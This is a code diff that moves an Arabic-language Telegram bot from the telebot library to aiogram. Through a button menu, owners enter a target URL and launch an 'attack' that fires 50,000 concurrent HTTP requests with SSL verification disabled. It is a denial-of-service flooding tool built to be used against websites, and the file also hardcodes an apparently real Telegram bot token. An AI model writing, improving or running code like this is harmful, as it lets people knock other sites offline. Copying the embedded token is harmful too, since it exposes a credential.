@@ -1,11 +1,13 @@
 import aiohttp
 import asyncio
 import urllib3
-import time
-from concurrent.futures import ThreadPoolExecutor
-import telebot
-from telebot.async_telebot import AsyncTeleBot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+import logging
+from aiogram import Bot, Dispatcher, types
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.utils import executor
+
+# إعداد الـ logging
+logging.basicConfig(level=logging.INFO)
 
 # تعطيل التحقق من صحة شهادة SSL
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -47,7 +49,7 @@ async def attack(url, session):
 
 async def start_attack(url):
     stop_attack_event.clear()
-    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(verify_ssl=False)) as session:
+    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
         tasks = []
         for _ in range(50000):
             tasks.append(attack(url, session))
@@ -67,16 +69,18 @@ async def calculate_speed():
         print(f"سرعة النقل: {speed:.2f} MB/s")
 
 TOKEN = '7317402155:AAHNB3hgGqKXiLqF1OhTYLG78HmTlm8dYI4'  # استبدل برمز التوكن الخاص بك
-bot = AsyncTeleBot(TOKEN)
+bot = Bot(token=TOKEN)
+dp = Dispatcher(bot)
 
 def is_owner(user_id):
     return str(user_id) in Owner
 
-async def send_welcome(message):
+@dp.message_handler(commands=['start'])
+async def send_welcome(message: types.Message):
     if is_owner(message.from_user.id):
-        await bot.reply_to(message, "مرحبًا بك في بوت ديابلو! استخدم القائمة أدناه لاختيار الأوامر.")
+        await message.reply("مرحبًا بك في بوت ديابلو! استخدم القائمة أدناه لاختيار الأوامر.")
     else:
-        await bot.reply_to(message, "أنت لا تملك الصلاحيات الكافية لاستخدام هذا البوت.")
+        await message.reply("أنت لا تملك الصلاحيات الكافية لاستخدام هذا البوت.")
 
     if is_owner(message.from_user.id):
         markup = InlineKeyboardMarkup()
@@ -86,59 +90,56 @@ async def send_welcome(message):
         markup.add(InlineKeyboardButton("إيقاف الهجوم", callback_data="stop_attack"))
         await bot.send_message(message.chat.id, "اختر أحد الأوامر:", reply_markup=markup)
 
-@bot.callback_query_handler(func=lambda call: True)
-async def callback_query(call):
-    if is_owner(call.message.chat.id):
+@dp.callback_query_handler(lambda call: True)
+async def callback_query(call: types.CallbackQuery):
+    if is_owner(call.from_user.id):
         if call.data == "add_user":
             msg = await bot.send_message(call.message.chat.id, "أدخل معرف المستخدم لإضافته:")
-            await bot.register_next_step_handler(msg, process_add_user)
+            await dp.register_next_step_handler(msg, process_add_user)
         elif call.data == "remove_user":
             msg = await bot.send_message(call.message.chat.id, "أدخل معرف المستخدم لإزالته:")
-            await bot.register_next_step_handler(msg, process_remove_user)
+            await dp.register_next_step_handler(msg, process_remove_user)
         elif call.data == "start_attack":
             msg = await bot.send_message(call.message.chat.id, "أدخل رابط الهدف لبدء الهجوم:")
-            await bot.register_next_step_handler(msg, process_start_attack)
+            await dp.register_next_step_handler(msg, process_start_attack)
         elif call.data == "stop_attack":
             stop_attack()
             await bot.send_message(call.message.chat.id, "تم إيقاف الهجوم.")
     else:
         await bot.send_message(call.message.chat.id, "أنت لا تملك الصلاحيات الكافية لاستخدام هذا البوت.")
 
-async def process_add_user(message):
+async def process_add_user(message: types.Message):
     new_user = message.text.strip()
     if new_user not in NormalUsers:
         NormalUsers.append(new_user)
         with open('normal_users.txt', 'a') as file:
             file.write(f"{new_user}\n")
-        await bot.reply_to(message, f"تمت إضافة المستخدم: {new_user}")
+        await bot.send_message(message.chat.id, f"تمت إضافة المستخدم: {new_user}")
     else:
-        await bot.reply_to(message, "المستخدم موجود بالفعل في القائمة.")
+        await bot.send_message(message.chat.id, "المستخدم موجود بالفعل في القائمة.")
 
-async def process_remove_user(message):
+async def process_remove_user(message: types.Message):
     user_to_remove = message.text.strip()
     if user_to_remove in NormalUsers:
         NormalUsers.remove(user_to_remove)
         with open('normal_users.txt', 'w') as file:
             for user in NormalUsers:
                 file.write(f"{user}\n")
-        await bot.reply_to(message, f"تمت إزالة المستخدم: {user_to_remove}")
+        await bot.send_message(message.chat.id, f"تمت إزالة المستخدم: {user_to_remove}")
     else:
-        await bot.reply_to(message, "المستخدم غير موجود في القائمة.")
+        await bot.send_message(message.chat.id, "المستخدم غير موجود في القائمة.")
 
-async def process_start_attack(message):
+async def process_start_attack(message: types.Message):
     url = message.text.strip()
     if url:
-        await bot.reply_to(message, f"بدء الهجوم على: {url}")
+        await bot.send_message(message.chat.id, f"بدء الهجوم على: {url}")
 
         speed_task = asyncio.create_task(calculate_speed())
         attack_task = asyncio.create_task(start_attack(url))
 
         await asyncio.gather(speed_task, attack_task)
     else:
-        await bot.reply_to(message, "لم يتم إدخال رابط الهدف بشكل صحيح.")
-
-async def main():
-    await bot.polling(non_stop=True)
+        await bot.send_message(message.chat.id, "لم يتم إدخال رابط الهدف بشكل صحيح.")
 
 if __name__ == '__main__':
-    asyncio.run(main())
+    executor.start_polling(dp, skip_updates=True)
